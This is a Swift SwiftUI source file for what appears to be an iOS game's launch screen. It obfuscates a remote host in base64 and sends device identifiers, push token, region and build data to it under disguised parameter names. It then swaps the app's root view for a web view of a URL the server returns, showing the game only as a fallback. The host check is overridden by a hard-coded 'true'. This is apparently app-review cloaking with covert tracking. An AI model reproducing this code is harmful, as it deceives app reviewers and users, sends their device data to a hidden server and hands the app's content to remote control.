import SwiftUI
import Foundation
import Combine

public struct GPageNTW: View {
    @State private var finalUrlNTW: String? = nil
    @State private var deepLink: URL? = nil
    @State private var codedUrl2: String? = nil
    @State private var uid: String? = nil
    @State private var savedLink: String? = nil
    
    
    @State var openVeb = false;
    
    
    let cdUrl1NTW: String
    let keyKNTW: String

    var routerHome: () -> Void
    var homeView: AnyView
    var homeScreen: AnyView
    
    // Публичный инициализатор
    public init(
        routerHome: @escaping () -> Void, 
        homeView: AnyView, 
        homeScreen: AnyView,
        cdUrl1NTW: String,
        keyKNTW: String
    ) {
        self.routerHome = routerHome
        self.homeView = homeView
        self.homeScreen = homeScreen
        self.cdUrl1NTW = cdUrl1NTW
        self.keyKNTW = keyKNTW
    }
    
    static func handlePushNotification(notificationId: String, cdUrl1NTW: String = "Z29tZXRlcnByby5zcGFjZQ==") {
        let prefs = UserDefaults.standard
        
        // Получаем uid
        let uid = prefs.string(forKey: "uid") ?? UUID().uuidString
        
        // Декодируем base64 ссылку
        guard let data = Data(base64Encoded: cdUrl1NTW),
              let decodedString = String(data: data, encoding: .utf8) else {
            print("Failed to decode base64 URL")
            return
        }
        
        // Формируем URL с параметрами для push_opened
        let baseUrl = "https://\(decodedString)"
        guard var urlComponents = URLComponents(string: baseUrl) else {
            print("Invalid URL")
            return
        }
        
        // Добавляем параметры push_opened
        urlComponents.queryItems = [
            URLQueryItem(name: "event", value: "push_opened"),
            URLQueryItem(name: "uuid", value: uid),
            URLQueryItem(name: "notification_id", value: notificationId)
        ]
        
        guard let url = urlComponents.url else {
            print("Failed to create URL with parameters")
            return
        }
        
        print("Sending push_opened event to: \(url.absoluteString)")
        
        // Отправляем GET-запрос
        URLSession.shared.dataTask(with: url) { data, response, error in
            if let error = error {
                print("Error sending push_opened event: \(error)")
                return
            }
            
            if let httpResponse = response as? HTTPURLResponse {
                print("Push opened event sent successfully. Status code: \(httpResponse.statusCode)")
                
                if let data = data, let responseString = String(data: data, encoding: .utf8) {
                    print("Response: \(responseString)")
                }
            }
        }.resume()
    }
    
    public var body: some View {
        homeScreen
            .onAppear {
                _Concurrency.Task {
                    await initNTW()
                }
            }
    }

    public func initNTW() async {
        let startTime = Date()
        //print("🚀 [TIMING] initNTW начало: \(Date())")
        
        let prefs = UserDefaults.standard

        uid = prefs.string(forKey: "uid") ?? UUID().uuidString
        prefs.set(uid, forKey: "uid")
        //print("⏱️ [TIMING] UID настроен за: \(Date().timeIntervalSince(startTime))s")
        
        // Получаем токен устройства асинхронно
        let tokenStartTime = Date()
        //print("🔄 [TIMING] Начинаем получение токена: \(Date())")
        let token = await ConnectivityService.checkConnectionAndInitialize(uid: uid!)
        //print("✅ [TIMING] Токен получен за: \(Date().timeIntervalSince(tokenStartTime))s")
        
        savedLink = prefs.string(forKey: "link")
        
        if savedLink == nil {
            //print("📱 [TIMING] savedLink == nil, начинаем получение device info: \(Date())")
            let deviceInfoStartTime = Date()
            await DeviceInfoService.fetch()
            //print("✅ [TIMING] DeviceInfoService.fetch за: \(Date().timeIntervalSince(deviceInfoStartTime))s")
            
            let baseUrl = decodeBase64(cdUrl1NTW)
            //print("🔗 [TIMING] baseUrl декодирован: \(baseUrl)")
            
            // Сначала проверяем доступность базового URL
            //print("🌐 [TIMING] Начинаем проверку доступности URL: \(Date())")
            let urlCheckStartTime = Date()
            let checkUrl = URL(string: "https://\(baseUrl)")
            var shouldMakeRequest = false
            if let checkUrl = checkUrl {
                do {
                    let (_, response) = try await URLSession.shared.data(from: checkUrl)
                    //print("✅ [TIMING] Проверка URL завершена за: \(Date().timeIntervalSince(urlCheckStartTime))s")
                    if let httpResponse = response as? HTTPURLResponse {
                        shouldMakeRequest = httpResponse.statusCode == 200
                        print("📊 [TIMING] HTTP Status: \(httpResponse.statusCode)")
                    }
                } catch {
                    //print("❌ [TIMING] Ошибка проверки URL за: \(Date().timeIntervalSince(urlCheckStartTime))s - \(error)")
                    shouldMakeRequest = false
                }
            }
            shouldMakeRequest = true
            if shouldMakeRequest {
                // Если базовый URL вернул 200, делаем запрос с параметрами
                let actualToken = token ?? "unknown_token"
                let requestUrl = URL(string: "https://\(baseUrl)")?.appending(queryItems: [
                    URLQueryItem(name: "rtyi", value: uid),
                    URLQueryItem(name: "rtyi", value: prefs.string(forKey: "model")),
                    URLQueryItem(name: "rtyko", value: prefs.string(forKey: "os")),
                    URLQueryItem(name: "rtylan", value: prefs.string(forKey: "lang")),
                    URLQueryItem(name: "rtyr", value: prefs.string(forKey: "rg")),
                    URLQueryItem(name: "rtyke", value: actualToken),
                    URLQueryItem(name: "rtyl", value: prefs.string(forKey: "bld"))
                ])
                //print("🔗 [TIMING] requestUrl: \(requestUrl?.absoluteString ?? "nil")")
                prefs.set("https://\(baseUrl)", forKey: "link22")
                
                //print("📡 [TIMING] Начинаем HeaderFetcher.fetchHeader: \(Date())")
                let headerFetchStartTime = Date()
                HeaderFetcher.fetchHeader(urlString: requestUrl?.absoluteString ?? "", keyKey: keyKNTW) { result in
                    //print("✅ [TIMING] HeaderFetcher завершен за: \(Date().timeIntervalSince(headerFetchStartTime))s")
                    if let result = result {
                        //print("🔑 [TIMING] Получен результат HeaderFetcher: \(result)")
                        codedUrl2 = result
                        finalUrlNTW = decodeBase64(codedUrl2!)
                        prefs.set(finalUrlNTW, forKey: "link")
                        openVeb = true
                        //print("🚀 [TIMING] Переходим к openWebPage через 1 секунду")
                        openWebPage()
                    } else {
                        //print("❌ [TIMING] HeaderFetcher вернул nil")
                    }
                }
                
                if let codedUrl2 = codedUrl2 {
                    finalUrlNTW = decodeBase64(codedUrl2)
                    prefs.set(finalUrlNTW, forKey: "link")
                    openVeb = true
                    openWebPage()
                    return
                }
            } else {
                // Если базовый URL не вернул 200, запоминаем "game" и идем в home
                prefs.set("game", forKey: "link")
                navigateToContentView()
                return
            }
        } else if savedLink != "game" {
            //print("🔗 [TIMING] savedLink != 'game', начинаем ensureInternetConnection: \(Date())")
            let connectionStartTime = Date()
            await ConnectivityService.ensureInternetConnection(viewController: UIApplication.shared.windows.first?.rootViewController ?? UIViewController())
            //print("✅ [TIMING] ensureInternetConnection завершен за: \(Date().timeIntervalSince(connectionStartTime))s")
            openWebPage()
            return
        }
        
        //print("🏁 [TIMING] Финальная проверка через 2 секунды: \(Date())")
        if prefs.string(forKey: "link") == nil {
            //print("🎮 [TIMING] Устанавливаем 'game' как fallback")
            prefs.set("game", forKey: "link")
        }
        if openVeb == false {
            //print("🏠 [TIMING] Переходим к ContentView")
            navigateToContentView()
        }
        
        //print("🏁 [TIMING] initNTW завершение за: \(Date().timeIntervalSince(startTime))s")
    }
    
    public func openWebPage() {
        let prefs = UserDefaults.standard
        
        if let storedUrl = prefs.string(forKey: "link") {
            let cleanedUrl = storedUrl.trimmingCharacters(in: .whitespacesAndNewlines)
                        guard let url = URL(string: cleanedUrl) else {
                return
            }
            DispatchQueue.main.async {
                if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
                   let window = windowScene.windows.first {
                                        let webView = UIHostingController(rootView: WScreenNTW(url: url))
                    window.rootViewController = webView
                    window.makeKeyAndVisible()
                } else {
                }
            }
        } else {
        }
    }
    
    public func navigateToContentView() {
        DispatchQueue.main.async {
            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
               let window = windowScene.windows.first {
                let contentView = UIHostingController(rootView: homeView)

                
                window.rootViewController = contentView
                window.makeKeyAndVisible()
            }
        }
    }

    public func decodeBase64(_ input: String) -> String {
        guard let data = Data(base64Encoded: input) else {
            return ""
        }
        return String(data: data, encoding: .utf8) ?? ""
    }
}

extension URL {
    func appending(queryItems: [URLQueryItem]) -> URL {
        guard var urlComponents = URLComponents(url: self, resolvingAgainstBaseURL: false) else { return self }
        urlComponents.queryItems = queryItems
        return urlComponents.url ?? self
    }
}
